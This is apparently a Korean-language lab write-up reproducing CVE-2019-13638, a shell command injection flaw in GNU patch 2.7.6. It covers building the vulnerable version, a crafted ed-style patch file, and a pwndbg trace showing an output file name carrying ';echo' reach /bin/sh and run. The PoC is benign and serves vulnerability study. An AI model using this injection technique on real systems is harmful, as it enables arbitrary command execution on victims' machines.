# CVE-2019-13638
## 1. 환경 설정
취약한 버전으로 patch를 다운로드 받습니다.
```
git clone --recursive https://git.savannah.gnu.org/git/patch.git && cd patch && git checkout 123eaff && git submodule update --init --recursive
```
**디버그용 플래그 지정**
```
export CFLAGS="-g3 -O0 -fno-pie -fno-omit-frame-pointer \
               -fno-inline -fno-optimize-sibling-calls \
               -Wall -Wextra -Wshadow -Wformat=2 -rdynamic -DDEBUG"
export LDFLAGS="-no-pie -rdynamic"

```
**설정 & 빌드**
```
./configure CC=gcc CFLAGS="$CFLAGS" LDFLAGS="$LDFLAGS" --prefix=$PWD/../install-2.7.6
make -j$(nproc)
make install
```
**빌드 후 버전확인**
```
$ ./install-2.7.6/bin/patch --version
GNU patch 2.7.6.6-123e
Copyright (C) 2003, 2009-2012 Free Software Foundation, Inc.
Copyright (C) 1988 Larry Wall

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Larry Wall and Paul Eggert
```
---

## 2. Proof of Concept
### Description
GNU patch through 2.7.6 is vulnerable to OS shell command injection that can be exploited by opening a crafted patch file that contains an ed style diff payload with shell metacharacters. 

### Exploit
- (참고)github POC(개념 증명) 
`https://raw.githubusercontent.com/irsl/gnu-patch-vulnerabilities/refs/heads/master/CVE-2019-13638.patch`


**개념 증명(POC)**

- 개념 증명을 위한 patch 파일 제작
아래 내용을 `my_patch.patch`로 저장합니다.
```
diff --git empty a.txt
copy from empty
copy to tmpfile
0a
foo
.
```

- 이후, 테스트를 적용할 원본 파일을 만들기 위해 빈 파일을 하나 생성한 뒤에 pach 명령을 실시합니다.
```
$ touch empty
$ ./install-2.7.6/bin/patch -o ';echo "helloworld";.txt' empty my_patch.patch
```



---
##  GDB 
분석 과정에서 추출한 슬라이스 지점마다 브레이크포인트를 설정해, 슬라이스된 코드와 작성한 PoC가 예상대로 동작하는지 확인합니다.

```
b pch.c:2473
b patch.c:337 
b patch.c:21
b patch.c:317
b util.c:1669
b patch.c:253 
b patch.c:959 

watch TMPOUTNAME  
```


`set args` 로 인자를 지정한뒤 `r` 명령으로 실행시키면 다음과 같이 볼 수 있습니다.
```
pwndbg> set args -o ';echo "helloworld";.txt' empty my_patch.patch
pwndbg> r
....
pwndbg> c
Continuing.

Breakpoint 7, get_some_switches () at patch.c:959
959			outfile = xstrdup (optarg);
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/patch.c:959
   954                 break;
   955             case 'N':
   956                 noreverse = true;
   957                 break;
   958             case 'o':
 ► 959                 outfile = xstrdup (optarg);
   960                 break;
   961             case 'p':
   962                 strippath = numeric_string (optarg, false, "strip count");
   963                 break;
   964             case 'r':
pwndbg> c
Continuing.

Breakpoint 6, main (argc=5, argv=0x7fffffffe578) at patch.c:253
253		    outname = outfile;
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/patch.c:253
   248         }
   249 
   250       if (! skip_rest_of_patch)
   251         {
   252           if (outfile)
 ► 253             outname = outfile;
   254           else if (pch_copy () || pch_rename ())
   255             outname = pch_name (! reverse);
   256           else
   257             outname = inname;
   258         }
pwndbg> p outname
$1 = 0x0
pwndbg> p outfile
$2 = 0x442470 ";echo \"helloworld\";.txt"
pwndbg> c
Continuing.

Breakpoint 4, main (argc=5, argv=0x7fffffffe578) at patch.c:317
317	      outfd = make_tempfile (&TMPOUTNAME, 'o', outname,
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/patch.c:317
   312               somefailed = true;
   313             }
   314         }
   315 
   316       tmpoutst.st_size = -1;
 ► 317       outfd = make_tempfile (&TMPOUTNAME, 'o', outname,
   318                              O_WRONLY | binary_transput,
   319                              instat.st_mode & S_IRWXUGO);
   320       if (outfd == -1)
   321         {
   322           if (errno == ELOOP || errno == EXDEV)
pwndbg> c
Continuing.

Breakpoint 5, make_tempfile (name=0x43d718 <TMPOUTNAME>, letter=111 'o', real_name=0x442470 ";echo \"helloworld\";.txt", flags=1, mode=436) at util.c:1669
1669	  *name = template;
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/util.c:1669
   1664 
   1665       template = xmalloc (strlen (tmpdir) + 10);
   1666       sprintf (template, "%s/p%cXXXXXX", tmpdir, letter);
   1667     }
   1668   fd = try_tempname(template, 0, &args, try_safe_open);
 ► 1669   *name = template;
   1670   return fd;
   1671 }
   1672 
   1673 int stat_file (char const *filename, struct stat *st)
   1674 {
pwndbg> p name
$3 = (const char **) 0x43d718 <TMPOUTNAME>
pwndbg> p template
$4 = 0x443940 "./;echo \"helloworld\";.txt.oP8izfk"
pwndbg> c
Continuing.

Hardware watchpoint 8: TMPOUTNAME

Old value = 0x0
New value = 0x443940 "./;echo \"helloworld\";.txt.oP8izfk"
make_tempfile (name=0x43d718 <TMPOUTNAME>, letter=111 'o', real_name=0x442470 ";echo \"helloworld\";.txt", flags=1, mode=436) at util.c:1670
1670	  return fd;
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/util.c:1670
   1665       template = xmalloc (strlen (tmpdir) + 10);
   1666       sprintf (template, "%s/p%cXXXXXX", tmpdir, letter);
   1667     }
   1668   fd = try_tempname(template, 0, &args, try_safe_open);
   1669   *name = template;
 ► 1670   return fd;
   1671 }
   1672 
   1673 int stat_file (char const *filename, struct stat *st)
   1674 {
   1675   int (*xstat)(char const *, struct stat *) =
pwndbg> c
Continuing.

Breakpoint 2, main (argc=5, argv=0x7fffffffe578) at patch.c:337
337		do_ed_script (inname, TMPOUTNAME, &TMPOUTNAME_needs_removal,
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/patch.c:337
   332       else
   333         TMPOUTNAME_needs_removal = true;
   334       if (diff_type == ED_DIFF) {
   335         outstate.zero_output = false;
   336         somefailed |= skip_rest_of_patch;
 ► 337         do_ed_script (inname, TMPOUTNAME, &TMPOUTNAME_needs_removal,
   338                       outstate.ofp);
   339         if (! dry_run && ! outfile && ! skip_rest_of_patch)
   340           {
   341             if (fstat (outfd, &tmpoutst) != 0)
   342               pfatal ("%s", TMPOUTNAME);
pwndbg> c
Continuing.
....
pwndbg> c
Continuing.

Thread 2.1 "patch" hit Breakpoint 1, do_ed_script (inname=0x442490 "empty", outname=0x443940 "./;echo \"helloworld\";.txt.oP8izfk", outname_needs_removal=0x43d729 <TMPOUTNAME_needs_removal>, ofp=0x4424d0) at pch.c:2473
2473		    execl ("/bin/sh", "sh", "-c", buf, (char *) 0);
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /work/CVE-2019-13638-github/patch/src/pch.c:2473
   2468         if (pid == -1)
   2469           pfatal ("Can't fork");
   2470         else if (pid == 0)
   2471           {
   2472             dup2 (tmpfd, 0);
 ► 2473             execl ("/bin/sh", "sh", "-c", buf, (char *) 0);
   2474             _exit (2);
   2475           }
   2476         else
   2477           {
   2478             int wstatus;
pwndbg> c
Continuing.
process 50486 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No source file named pch.c.
Error in re-setting breakpoint 2: No source file named patch.c.
Error in re-setting breakpoint 3: No source file named patch.c.
Error in re-setting breakpoint 4: No source file named patch.c.
Error in re-setting breakpoint 5: No source file named util.c.
Error in re-setting breakpoint 6: No source file named patch.c.
Error in re-setting breakpoint 7: No source file named patch.c.
Error in re-setting breakpoint 8: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 8: No symbol "TMPOUTNAME" in current context.
Error in re-setting breakpoint 8: No symbol "TMPOUTNAME" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 8: No symbol "TMPOUTNAME" in current context.
sh: 1: ed: not found
helloworld
sh: 1: .txt.oP8izfk: not found
/work/CVE-2019-13638-github/install-2.7.6/bin/patch: **** ed FAILED
[Inferior 2 (process 50486) exited with code 0177]
pwndbg> 

```

마지막 위치를 보면 `helloworld` 가 적절히 프린트 된 모습을 볼 수 있습니다.